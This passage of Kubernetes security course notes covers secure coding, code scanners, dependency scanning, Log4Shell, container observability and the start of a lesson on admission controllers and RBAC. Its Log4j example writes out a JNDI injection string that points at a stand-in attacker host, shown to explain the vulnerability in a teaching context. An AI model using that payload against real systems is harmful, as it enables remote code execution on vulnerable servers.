# Example in Python with SQLAlchemy
from sqlalchemy import text

stmt = text("SELECT * FROM users WHERE username=:user AND password=:pass")
result = engine.execute(stmt, {"user": user_input, "pass": password_input})
```

### Static Analysis Tools

Automated scanners detect unsafe patterns like raw SQL concatenation before code merges into main:

| Tool      | Language Support                   | Key Feature                        |
| --------- | ---------------------------------- | ---------------------------------- |
| SonarQube | Java, JavaScript, Python, and more | Highlights security hotspots       |
| ReSharper | .NET/C#                            | Integrates into Visual Studio      |
| Veracode  | Multiple                           | Cloud-based vulnerability scanning |
| Codacy    | JavaScript, Python, Ruby, Java     | Inline code review with CI plugins |

![The image features the SonarQube logo and a dashboard showing a "Passed" quality gate with metrics on reliability, security, coverage, and duplications. It also highlights the benefits of detecting problematic code patterns and mitigating identified risks.](https://kodekloud.com/kk-media/image/upload/v1752880872/notes-assets/images/Kubernetes-and-Cloud-Native-Security-Associate-KCSA-Workload-and-Application-Code-Security/sonarqube-dashboard-quality-gate-metrics.jpg)

> **lightbulb** Incorporate static analysis into your CI/CD pipeline to catch vulnerabilities early and maintain code quality over time.

## 2. Scanning Third-Party Dependencies

Your application often relies on external libraries that may harbor known vulnerabilities. Regularly auditing these dependencies is vital.

### Sample Flask Application

```python theme={null}
from flask import Flask, request, jsonify, render_template
import requests
from sqlalchemy import create_engine, text
import pandas as pd
from jinja2 import Template

app = Flask(__name__)
engine = create_engine('sqlite:///test.db')
```

### Dependency Scanners

| Scanner                | Ecosystem                    | Description                                                            |
| ---------------------- | ---------------------------- | ---------------------------------------------------------------------- |
| OWASP Dependency-Check | Java, .NET                   | Matches manifest files (`pom.xml`, `packages.config`) to CVE databases |
| Snyk                   | JavaScript, Python, Go, Java | Continuous monitoring with automatic pull requests                     |
| GitHub Dependabot      | Multiple                     | Native GitHub alerts and automated dependency updates                  |

> **triangle-alert** Outdated dependencies can quickly become attack vectors. Schedule automated scans (e.g., daily or on pull requests) to remediate vulnerabilities promptly.

## 3. Log4j and Application Security Monitoring

The Log4Shell incident demonstrated that even trusted logging frameworks can introduce critical RCE vulnerabilities.

```java theme={null}
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jExample {
    private static final Logger logger = LogManager.getLogger(Log4jExample.class);

    public static void main(String[] args) {
        String userInput = "${jndi:ldap://attacker.com/a}";
        logger.info("User input received: " + userInput);
        System.out.println("Log statement executed successfully.");
    }
}
```

### Real-Time Detection

Integrate runtime protection tools to catch anomalies, even for zero-day exploits:

* [Datadog Application Security Monitoring](https://www.datadoghq.com/product/application-security-monitoring/)
* AWS WAF with custom rules
* Azure Application Gateway Web Application Firewall

## 4. Observability in Containerized Environments

Monitoring your application’s resource usage and behavior in real time is essential for both performance tuning and security forensic.

![The image is a presentation slide for "Sysdig Secure," featuring three icons labeled "Securing," "Monitoring," and "Control."](https://kodekloud.com/kk-media/image/upload/v1752880873/notes-assets/images/Kubernetes-and-Cloud-Native-Security-Associate-KCSA-Workload-and-Application-Code-Security/sysdig-secure-securing-monitoring-control.jpg)

### Key Observability Features

| Capability          | Benefit                                            |
| ------------------- | -------------------------------------------------- |
| System Call Tracing | Detect suspicious process events and file access   |
| Resource Metrics    | Identify CPU/memory spikes that may signal attacks |
| Network Monitoring  | Visualize container-to-container traffic flows     |

> **lightbulb** Correlate logs, metrics, and traces to quickly pinpoint root causes—whether it’s a memory leak, cryptojacking, or container escape.

***

## Next Steps

* Adopt secure coding standards across all languages and frameworks.
* Automate dependency scanning and static analysis in your CI/CD workflows.
* Deploy runtime security agents and observability platforms to detect and respond to threats.

By following these best practices, you’ll strengthen your application’s security posture and ensure a resilient production environment.

## References

* [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
* [Datadog Application Security Monitoring](https://www.datadoghq.com/product/application-security-monitoring/)
* [Sysdig Secure](https://sysdig.com/products/secure/)
* [SonarQube Documentation](https://docs.sonarqube.org/)

- [Watch Video](https://learn.kodekloud.com/user/courses/kubernetes-and-cloud-native-security-associate-kcsa/module/a0ddd095-0114-4aa4-b3a5-2b31e773f241/lesson/bb4c4f9e-8293-4846-bde9-895e659743c3)


# Admission Controllers

Source: https://notes.kodekloud.com/docs/Kubernetes-and-Cloud-Native-Security-Associate-KCSA/Platform-Security/Admission-Controllers/page

Admission Controllers are plugins that enforce policies, mutate objects, or perform actions on requests to the Kubernetes API server before they are stored.

Admission Controllers are plugins that intercept requests to the Kubernetes API server **after** authentication and authorization but **before** they’re persisted in etcd. They enable cluster operators to enforce policies, mutate objects, or perform background actions automatically.

## Kubernetes API Request Flow

When you run a `kubectl` command (e.g., creating a Pod), the request follows these steps:

1. **Authentication** (AuthN): Verify user identity (usually via certificates in your kubeconfig).
2. **Authorization** (AuthZ): Check if the requester has permission (via RBAC, ABAC, Node, Webhook).
3. **Admission Control** (Admission Controllers): Validate or mutate objects.
4. **Persistence**: Store the final object in etcd.

![The image is a flowchart illustrating the process of creating a pod in Kubernetes, involving steps like authentication, authorization, and admission controllers.](https://kodekloud.com/kk-media/image/upload/v1752880875/notes-assets/images/Kubernetes-and-Cloud-Native-Security-Associate-KCSA-Admission-Controllers/kubernetes-pod-creation-flowchart.jpg)

## Authentication & Authorization Examples

### kubeconfig Snippet

```bash theme={null}
cat ~/.kube/config
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0t...
    server: https://your-api-server
contexts:
- context:
    cluster: your-cluster
    user: your-user
  name: your-context
current-context: your-context
users:
- name: your-user
  user:
    client-certificate-data: LS0t...
    client-key-data: LS0t...
```

### RBAC Role for Pod Operations

```yaml theme={null}
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: developer
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["list", "get", "create", "update", "delete"]
```

You can further restrict to specific Pod names:

```yaml theme={null}
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: limited-developer
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create"]
  resourceNames: ["blue", "orange"]
```

## Why Admission Controllers?

RBAC governs **who** can perform **what** at the API surface. It cannot inspect or change the contents of an object. For example, you may want to enforce:

* Only use images from an internal registry
* Disallow `:latest` tags
* Prevent containers from running as root
* Inject security capabilities or sidecars
* Require specific labels or annotations

```yaml theme={null}
apiVersion: v1
kind: Pod
metadata:
  name: web-pod
spec:
  containers:
  - name: ubuntu
    image: ubuntu:latest
    command: ["sleep", "3600"]
    securityContext:
      runAsUser: 0
      capabilities:
        add: ["MAC_ADMIN"]
```

> **lightbulb** Admission Controllers can **validate** (reject bad requests) or **mutate** (inject defaults, sidecars) before persistence.

## Built-in Admission Controllers

Kubernetes includes many Admission Controllers out of the box. Below is a summary of some common ones:

| Admission Controller | Behavior                                     |
| -------------------- | -------------------------------------------- |
| AlwaysPullImages     | Forces image pull for every Pod creation     |
| DefaultStorageClass  | Labels PVCs with a default StorageClass      |
| EventRateLimit       | Throttles API events to prevent overload     |
| NamespaceExists      | Rejects requests for non-existent namespaces |

## Namespace Admission Controllers

### NamespaceExists

By default, creating resources in a namespace that doesn’t exist yields:

```bash theme={null}
kubectl run nginx --image=nginx --namespace=blue
